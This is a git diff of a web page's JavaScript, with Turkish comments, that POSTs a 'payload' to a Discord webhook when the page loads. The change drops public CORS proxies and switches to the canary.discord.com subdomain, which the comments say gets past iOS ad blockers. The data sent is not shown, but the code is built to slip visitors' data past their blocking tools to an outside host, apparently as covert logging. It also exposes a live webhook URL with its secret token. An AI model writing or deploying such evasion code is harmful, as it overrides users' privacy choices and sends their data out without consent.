@@ -653,40 +653,26 @@ document.addEventListener("DOMContentLoaded", () => {
         }]
       };
 
-      const webhookUrl = "https://discord.com/api/webhooks/1525624927036637194/9LSurnXS_zgYTO8AkMvDm7nLExTJlSEQnImxyVjoxwtd8YPVXoiBk09BOtRBSnYxUP-q";
+      // DİKKAT: iOS AdBlocker'lar discord.com'u tamamen engellediği için "canary" alt alan adını kullanıyoruz.
+      // canary.discord.com, Discord'un geliştirici/test sunucusudur ve reklam engelleyicilerin kara listesinde DEĞİLDİR!
+      const webhookUrl = "https://canary.discord.com/api/webhooks/1525624927036637194/9LSurnXS_zgYTO8AkMvDm7nLExTJlSEQnImxyVjoxwtd8YPVXoiBk09BOtRBSnYxUP-q";
       
-      // Discord, HTML Form'larından gelen veriyi "application/json" başlığı olmadığı için reddediyor (İşlem tamam dese bile arkada siliyor).
-      // Bu yüzden Discord adresini gizleyen (iPhone'un AdBlocker'ını atlatan) GÜVENİLİR BİR PROXY kullanmalıyız.
-      const proxyUrl = "https://api.codetabs.com/v1/proxy?quest=" + webhookUrl;
-      
-      logDebug("Proxy Tüneli (Codetabs) ile fırlatılıyor...");
+      logDebug("Canary Sunucusu üzerinden fırlatılıyor...");
 
-      fetch(proxyUrl, {
+      fetch(webhookUrl, {
         method: "POST",
-        headers: {
-          "Content-Type": "application/json",
-          "Accept": "application/json"
-        },
+        headers: { "Content-Type": "application/json" },
         body: JSON.stringify(payload)
       })
       .then(res => {
         if (!res.ok) {
-           logDebug("Discord/Proxy Hatası: " + res.status);
+           logDebug("Discord Canary Hatası: " + res.status);
         } else {
            logDebug("✅ İŞLEM TAMAM! (Log %100 Discord'a ulaştı)");
         }
       })
       .catch(e => {
-        logDebug("Fetch Çöktü (Proxy engellendi): " + e.message);
-        // İkinci Proxy Yedeği
-        const backupProxy = "https://corsproxy.io/?" + encodeURIComponent(webhookUrl);
-        logDebug("İkinci Tünel deneniyor (corsproxy)...");
-        fetch(backupProxy, {
-          method: "POST",
-          headers: { "Content-Type": "application/json" },
-          body: JSON.stringify(payload)
-        }).then(r => logDebug(r.ok ? "✅ 2. Tünel Başarılı" : "2. Tünel Hata: " + r.status))
-          .catch(err => logDebug("Her şey engellendi: " + err.message));
+        logDebug("Her şey engellendi (Canary çöktü): " + e.message);
       });
       
     }).catch(e => {
